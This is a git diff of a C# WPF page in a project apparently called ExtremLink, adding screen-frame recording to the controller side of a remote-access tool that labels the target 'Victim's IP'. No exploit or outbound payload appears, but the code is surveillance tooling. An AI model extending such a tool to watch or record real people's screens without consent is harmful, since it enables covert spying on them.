@@ -12,6 +12,7 @@ using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
 using System.Windows.Media.Imaging;
+using System.Windows.Media.TextFormatting;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
 
@@ -26,15 +27,18 @@ namespace ExtremLink_Client_v2.Pages
         // Attirbutes:
         private ContentControl contentMain;
 
-        private Session currentSession;
+        private IList<AttackerSession> sessions;
         private Thread recordingThread;
 
         private bool isReceivingFrames;
+        private bool isRecordingFrame;
 
         public ControlPage(ContentControl contentMain)
         {
+            this.sessions = new List<AttackerSession>();
             this.contentMain = contentMain;
             this.isReceivingFrames = false;
+            this.isRecordingFrame = false;
             InitializeComponent();
             clientIpTextBlock.Text = $"Victim's IP: {Attacker.AttackerInstance.VictimIpAddr}";
         }
@@ -60,10 +64,16 @@ namespace ExtremLink_Client_v2.Pages
         }
         private void RecordBtn_Click(object sender, RoutedEventArgs e)
         {
-            if (!this.isReceivingFrames)
+            if (!this.isRecordingFrame && this.isReceivingFrames)
             {
-                Attacker.AttackerInstance.SendTCPMessageToClient("&", "StartRecord");
                 this.recordingStatusTextBlock.Text = "Record: on";
+                this.isRecordingFrame = true;
+                this.Record();
+            }
+            else
+            {
+                this.recordingStatusTextBlock.Text = "Record: off";
+                this.isRecordingFrame = false;
             }
         }
 
@@ -80,7 +90,6 @@ namespace ExtremLink_Client_v2.Pages
                 return null;
             }
         }
-
         private async void UpdateFrame()
         {
             
@@ -92,9 +101,25 @@ namespace ExtremLink_Client_v2.Pages
                     {
                         BitmapImage tempFrame = this.LoadFrameFromFile();
                         await Dispatcher.InvokeAsync(() => frameImg.Source = tempFrame);
+
+                        if (this.sessions.Count > 0)
+                        {
+                            // Check for adding frames to the session
+                            if (this.isReceivingFrames && this.isRecordingFrame)
+                            {
+                                this.sessions[this.sessions.Count - 1].WriteFrame(tempFrame);
+                            }
+
+                            // Check for closing the session
+                            if (!this.isRecordingFrame && this.sessions[this.sessions.Count - 1].IsActive)
+                            {
+                                this.sessions[this.sessions.Count - 1].Stop();
+                            }
+                        }
                     }
                     // Set the sleep function so the frame rate will be around ~30 FPS
                     await Task.Delay(32);
+
                     if (!this.isReceivingFrames)
                     {
                         break;
@@ -103,7 +128,7 @@ namespace ExtremLink_Client_v2.Pages
                 catch (Exception ex)
                 {
                     MessageBox.Show($"Error updating frame: {ex.Message}");
-                    isReceivingFrames = false;
+                    this.isReceivingFrames = false;
                 }
             }
         }
@@ -114,6 +139,22 @@ namespace ExtremLink_Client_v2.Pages
             // Output: The function loads the defualt non frame image.
             Dispatcher.InvokeAsync(() => frameImg.Source = new BitmapImage(new Uri("\\Images\\default_image.png", UriKind.RelativeOrAbsolute)));
         }
+
+        private async void Record()
+        {
+            // Input: Nothing.
+            // Output: The function records sessions.
+            AttackerSession record = new AttackerSession(800, 450);
+            this.sessions.Add(record);
+            this.sessions[this.sessions.Count - 1].Start();
+
+            while (this.isReceivingFrames && this.isRecordingFrame)
+            {
+                this.sessions[this.sessions.Count - 1].WriteFrame(this.LoadFrameFromFile());
+            }
+            this.sessions[this.sessions.Count - 1].Stop();
+        }
+
 
         // Mouse functions:
         private void FrameImg_MouseMove(object sender, MouseEventArgs e)
